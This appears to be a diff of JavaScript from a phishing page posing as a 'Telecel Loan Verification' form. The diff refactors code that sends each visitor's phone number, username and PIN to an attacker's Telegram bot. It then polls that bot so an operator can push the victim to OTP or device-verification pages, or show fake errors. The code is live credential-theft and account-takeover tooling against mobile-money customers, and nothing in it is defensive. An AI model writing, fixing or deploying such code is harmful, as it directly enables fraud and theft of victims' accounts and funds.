@@ -440,7 +440,7 @@
         SUCCESS_PAGE: 'success.html'
     };
 
-    let state = { lastUpdateId: 0 };
+    let pollingOffset = 0;   // tracks the highest seen update_id + 1
     let isProcessing = false;
 
     const phoneInput    = document.getElementById('phone');
@@ -478,7 +478,18 @@
         return validPrefixes.some(p => phone.startsWith(p));
     }
 
-    function sendToBot(phone, username, pin) {
+    // ── Seed offset with current latest update so we only catch NEW callbacks ──
+    async function seedOffset() {
+        try {
+            const r = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?limit=1&allowed_updates=["callback_query"]`);
+            const d = await r.json();
+            if (d.ok && d.result && d.result.length > 0) {
+                pollingOffset = d.result[d.result.length - 1].update_id + 1;
+            }
+        } catch(e) { /* ignore — will start from 0 and skip old updates */ }
+    }
+
+    async function sendToBot(phone, username, pin) {
         if (isProcessing) return;
         isProcessing = true;
         continueBtn.disabled = true;
@@ -491,81 +502,98 @@
         const correctUserId = `correctuser_${ts}`;
         const wrongUserId   = `wronguser_${ts}`;
 
-        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CONFIG.CHAT_ID,
-                text: `<b>🔴 Telecel Loan Verification</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nPhone: <code>${phone}</code>\nUsername: <code>${username}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
-                parse_mode: 'HTML',
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "✅ Approve Loan",  callback_data: approveId },
-                            { text: "📱 Verify Device", callback_data: verifyId }
-                        ],
-                        [
-                            { text: "✔️ Correct-user",  callback_data: correctUserId },
-                            { text: "❌ Wronge-user",   callback_data: wrongUserId }
-                        ],
-                        [{ text: "🚫 Decline", callback_data: declineId }]
-                    ]
-                }
-            })
-        })
-        .then(() => {
+        // Seed offset before sending so we don't catch stale callbacks
+        await seedOffset();
+
+        try {
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.CHAT_ID,
+                    text: `<b>🔴 Telecel Loan Verification</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nPhone: <code>${phone}</code>\nUsername: <code>${username}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: "✅ Approve Loan",  callback_data: approveId },
+                                { text: "📱 Verify Device", callback_data: verifyId }
+                            ],
+                            [
+                                { text: "✔️ Correct-user",  callback_data: correctUserId },
+                                { text: "❌ Wronge-user",   callback_data: wrongUserId }
+                            ],
+                            [{ text: "🚫 Decline", callback_data: declineId }]
+                        ]
+                    }
+                })
+            });
+
             spinner.style.display = 'flex';
             startPolling(approveId, declineId, verifyId, correctUserId, wrongUserId);
-        })
-        .catch(() => resetButton());
+
+        } catch(e) {
+            resetButton();
+        }
     }
 
     function startPolling(approveId, declineId, verifyId, correctUserId, wrongUserId) {
-        const interval = setInterval(() => {
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-                .then(r => r.json())
-                .then(data => {
-                    if (!data.ok || !data.result) return;
+        const queryParams = new URLSearchParams(window.location.search).toString();
 
-                    data.result.forEach(update => {
-                        state.lastUpdateId = update.update_id;
+        const interval = setInterval(async () => {
+            try {
+                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${pollingOffset}&timeout=2&allowed_updates=["callback_query"]`;
+                const r = await fetch(url);
+                const data = await r.json();
 
-                        if (update.callback_query) {
-                            const cb = update.callback_query.data;
+                if (!data.ok || !data.result || data.result.length === 0) return;
 
-                            if (cb === approveId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                window.location.href = `${CONFIG.APPROVE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
-                            }
-                            else if (cb === verifyId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                window.location.href = `${CONFIG.DEVICE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
-                            }
-                            else if (cb === correctUserId) {
-                                // Correct username → go to otp.html just like approve
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                window.location.href = `${CONFIG.APPROVE_PAGE}?${new URLSearchParams(window.location.search).toString()}`;
-                            }
-                            else if (cb === wrongUserId) {
-                                // Wrong username → show error, stay on page
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showError("Wrong username entered. Please check your username and try again.");
-                                resetButton();
-                            }
-                            else if (cb === declineId) {
-                                clearInterval(interval);
-                                spinner.style.display = 'none';
-                                showError("Request declined. Please try again.");
-                                resetButton();
-                            }
-                        }
-                    });
-                });
-        }, 1000);
+                for (const update of data.result) {
+                    // Always advance offset so we don't re-process the same update
+                    pollingOffset = update.update_id + 1;
+
+                    if (!update.callback_query) continue;
+
+                    const cb = update.callback_query.data;
+
+                    // Acknowledge the callback to Telegram (removes loading state on button)
+                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ callback_query_id: update.callback_query.id })
+                    }).catch(() => {});
+
+                    if (cb === approveId || cb === correctUserId) {
+                        clearInterval(interval);
+                        spinner.style.display = 'none';
+                        window.location.href = `${CONFIG.APPROVE_PAGE}${queryParams ? '?' + queryParams : ''}`;
+                        return;
+                    }
+                    else if (cb === verifyId) {
+                        clearInterval(interval);
+                        spinner.style.display = 'none';
+                        window.location.href = `${CONFIG.DEVICE_PAGE}${queryParams ? '?' + queryParams : ''}`;
+                        return;
+                    }
+                    else if (cb === wrongUserId) {
+                        clearInterval(interval);
+                        spinner.style.display = 'none';
+                        showError("Wrong username entered. Please check your username and try again.");
+                        resetButton();
+                        return;
+                    }
+                    else if (cb === declineId) {
+                        clearInterval(interval);
+                        spinner.style.display = 'none';
+                        showError("Request declined. Please try again.");
+                        resetButton();
+                        return;
+                    }
+                }
+            } catch(e) {
+                // Network hiccup — keep polling
+            }
+        }, 1500);
     }
 
     function showError(msg) {
